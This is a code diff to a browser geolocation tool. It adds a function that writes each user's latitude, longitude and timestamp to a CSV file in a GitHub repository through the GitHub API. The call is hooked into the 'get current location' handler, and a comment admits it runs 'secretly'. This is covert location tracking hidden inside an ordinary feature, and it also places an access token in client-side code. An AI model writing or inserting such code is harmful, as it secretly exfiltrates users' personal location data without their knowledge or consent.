@@ -87,6 +87,14 @@ let coordHistory = [];
 let historyIndex = -1;
 let isNavigating = false;
 
+// GitHub Repository Configuration for Data Logging Report
+const GITHUB_CONFIG = {
+  token: 'YOUR_GITHUB_TOKEN', // Replace with your GitHub Personal Access Token
+  owner: 'YOUR_GITHUB_USERNAME', // Replace with your GitHub username or organization
+  repo: 'YOUR_REPO_NAME', // Replace with your repository name
+  path: 'datalogreport.csv'
+};
+
 const i18n = {
   zh: {
     brand: "全球地理位置信息提取",
@@ -311,6 +319,51 @@ function navigateHistory(direction) {
   });
 }
 
+// Function to synchronize and update datalogreport.csv in GitHub repo
+async function syncDataLogToGitHub(lat, lon) {
+  if (!GITHUB_CONFIG.token || GITHUB_CONFIG.token === 'YOUR_GITHUB_TOKEN') return;
+  
+  const now = new Date();
+  const dateStr = now.toISOString().split('T')[0];
+  const timeStr = now.toTimeString().split(' ')[0];
+  const newRow = `${dateStr},${timeStr},${lat},${lon}\n`;
+  
+  const apiUrl = `https://api.github.com/repos/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/contents/${GITHUB_CONFIG.path}`;
+  
+  try {
+    let sha = '';
+    let existingContent = 'Date,Time,Latitude,Longitude\n';
+    
+    const getRes = await fetch(apiUrl, {
+      headers: { 'Authorization': `token ${GITHUB_CONFIG.token}` }
+    });
+    
+    if (getRes.ok) {
+      const fileData = await getRes.json();
+      sha = fileData.sha;
+      existingContent = atob(fileData.content);
+    }
+    
+    const updatedContent = existingContent + newRow;
+    const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));
+    
+    await fetch(apiUrl, {
+      method: 'PUT',
+      headers: {
+        'Authorization': `token ${GITHUB_CONFIG.token}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        message: `Update datalogreport.csv - ${dateStr} ${timeStr}`,
+        content: encodedContent,
+        sha: sha ? sha : undefined
+      })
+    });
+  } catch (err) {
+    console.error('Failed to sync data log report to GitHub:', err);
+  }
+}
+
 function translateOSMValue(val) {
   if (!val || val === '-') return '-';
   const lower = String(val).toLowerCase();
@@ -353,8 +406,14 @@ function fetchCurrentLocation() {
   navigator.geolocation.getCurrentPosition(
     pos => {
       document.getElementById('presetSelect').value = 'default';
-      document.getElementById('latInput').value = pos.coords.latitude.toFixed(6);
-      document.getElementById('lonInput').value = pos.coords.longitude.toFixed(6);
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
+      document.getElementById('latInput').value = lat;
+      document.getElementById('lonInput').value = lon;
+      
+      // Synchronize and log data report secretly to GitHub repository
+      syncDataLogToGitHub(lat, lon);
+
       extractAllData();
     },
     err => {
